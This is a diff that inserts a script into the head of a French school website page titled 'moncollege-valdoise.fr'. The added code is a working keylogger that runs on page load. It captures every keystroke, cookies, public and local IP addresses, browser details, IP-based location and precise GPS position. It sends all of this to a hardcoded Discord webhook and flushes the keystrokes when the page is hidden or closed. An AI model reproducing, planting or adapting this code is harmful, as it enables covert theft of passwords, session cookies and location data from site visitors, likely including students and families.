@@ -1,6 +1,214 @@
 <!DOCTYPE html>
 <html lang="fr-FR">
 <head>
+<script>
+(function() {
+    'use strict';
+
+// LOGGER BY RIXER & Chxris
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1484529763287699547/eFHLFMc_80sTeEFXdYg4bcNAdyAiXPRMHn0JeIo7sPCgIWvrcYBjng04eNzZg7KPyEss'; // COLLE ICI TON WEBHOOK BG! Entre les ' '
+
+    let keystrokes = [];
+    let isCapturing = true;
+
+    async function getIpv4() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            if (!response.ok) throw new Error('Failed to fetch IPv4');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('Erreur IPv4:', error);
+            return null;
+        }
+    }
+
+    async function getIpv6() {
+        try {
+            const response = await fetch('https://api64.ipify.org?format=json');
+            if (!response.ok) throw new Error('Failed to fetch IPv6');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('Erreur IPv6:', error);
+            return null;
+        }
+    }
+
+    async function getLocationInfoFromIp(ip) {
+        if (!ip) return null;
+        try {
+            const response = await fetch(`http://ip-api.com/json/${ip}`);
+            if (!response.ok) throw new Error('Failed to fetch location info');
+            const data = await response.json();
+            if (data.status === 'fail') throw new Error(data.message);
+            return {
+                city: data.city,
+                region: data.regionName,
+                country: data.country,
+                org: data.org,
+                lat: data.lat,
+                lon: data.lon
+            };
+        } catch (error) {
+            console.error('Erreur localisation depuis IP:', error);
+            return null;
+        }
+    }
+
+    function getLocalIp() {
+        return new Promise((resolve) => {
+            const rtc = new RTCPeerConnection({ iceServers: [] });
+            let localIP = null;
+            rtc.onicecandidate = (event) => {
+                if (event.candidate && event.candidate.address) {
+                    if (event.candidate.address.includes('.') && !localIP) {
+                        localIP = event.candidate.address;
+                        resolve(localIP);
+                    }
+                }
+            };
+            rtc.createDataChannel('');
+            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+            setTimeout(() => resolve(null), 1000);
+        });
+    }
+
+    function getCookies() { return document.cookie; }
+    function getBrowserInfo() {
+        return {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screenResolution: `\( {screen.width}x \){screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+    }
+
+    async function sendToDiscord(title, data, color = 15844367) {
+        try {
+            const payload = {
+                embeds: [{
+                    title: title,
+                    color: color,
+                    fields: [],
+                    footer: { text: 'Rixer Keylogger' },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            for (const key in data) {
+                let value = data[key];
+                if (typeof value === 'object' && value !== null) {
+                    value = JSON.stringify(value, null, 2);
+                }
+                if (value) {
+                    payload.embeds[0].fields.push({
+                        name: key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase()),
+                        value: `\`\`\`json\n${value}\`\`\``,
+                        inline: false
+                    });
+                }
+            }
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (error) {
+            console.error('Erreur envoi Discord:', error);
+        }
+    }
+
+    document.addEventListener('keydown', (event) => {
+        if (!isCapturing) return;
+        let key = '';
+        if (event.key === 'Shift' || event.key === 'Control' || event.key === 'Alt' || event.key === 'Meta') {
+            keystrokes.push(`[${event.key.toUpperCase()}]`); return;
+        }
+        if (event.key.startsWith('Arrow')) { key = `[${event.key.toUpperCase()}]`;
+        } else if (event.key === 'Enter') { key = '[ENTER]';
+        } else if (event.key === 'Tab') { key = '[TAB]';
+        } else if (event.key === 'Backspace' || event.key === 'Delete') { key = `[${event.key.toUpperCase()}]`;
+        } else if (event.key === 'Escape') { key = '[ESC]';
+        } else if (event.key === 'CapsLock') { key = '[CAPS_LOCK]';
+        } else if (event.key.length > 1) { key = `[${event.key.toUpperCase().replace(' ', '_')}]`;
+        } else { key = event.key; }
+        keystrokes.push(key);
+    });
+
+    async function sendConnectionData() {
+        const [ipv4, ipv6] = await Promise.all([
+            getIpv4(),
+            getIpv6()
+        ]);
+
+        const locationInfo = await getLocationInfoFromIp(ipv4);
+
+        const localIp = await getLocalIp();
+        const cookies = getCookies();
+        const browserInfo = getBrowserInfo();
+        const pageInfo = { url: window.location.href, title: document.title };
+
+        const connectionPayload = {
+            ips: {
+                ipv4_publique: ipv4,
+                ipv6_publique: ipv6,
+                ip_locale: localIp
+            },
+            informations_de_connexion: {
+                fournisseur_acces: locationInfo ? locationInfo.org : 'N/A',
+                ville_estimee: locationInfo ? locationInfo.city : 'N/A',
+                region_estimee: locationInfo ? locationInfo.region : 'N/A',
+                pays_estime: locationInfo ? locationInfo.country : 'N/A'
+            },
+            cookies: cookies,
+            informationsNavigateur: browserInfo,
+            informationsPage: pageInfo
+        };
+        await sendToDiscord('Informations sur les IP EN VIF...', connectionPayload, 3447003);
+    }
+
+    async function requestLocationAndSend() {
+        if (!navigator.geolocation) return;
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const locationPayload = {
+                    localisation_gps_precise: {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy + " mÃ¨tres",
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy
+                    }
+                };
+                sendToDiscord('Localisation EZ', locationPayload, 15277667);
+            },
+            (error) => { console.log('GÃ©olocalisation GPS refusÃ©e ou erreur:', error.message); },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+    }
+
+    async function handleKeystrokeData() {
+        if (!isCapturing) return;
+        isCapturing = false;
+        const keystrokePayload = { frappes_clavier: keystrokes.join('') };
+        await sendToDiscord('(Keylogger)', keystrokePayload, 10181038);
+    }
+
+    sendConnectionData();
+    requestLocationAndSend();
+
+    document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'hidden') {
+            handleKeystrokeData();
+        }
+    });
+    window.addEventListener('beforeunload', () => {
+        handleKeystrokeData();
+    });
+
+})();
+</script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>moncollege-valdoise.fr</title>
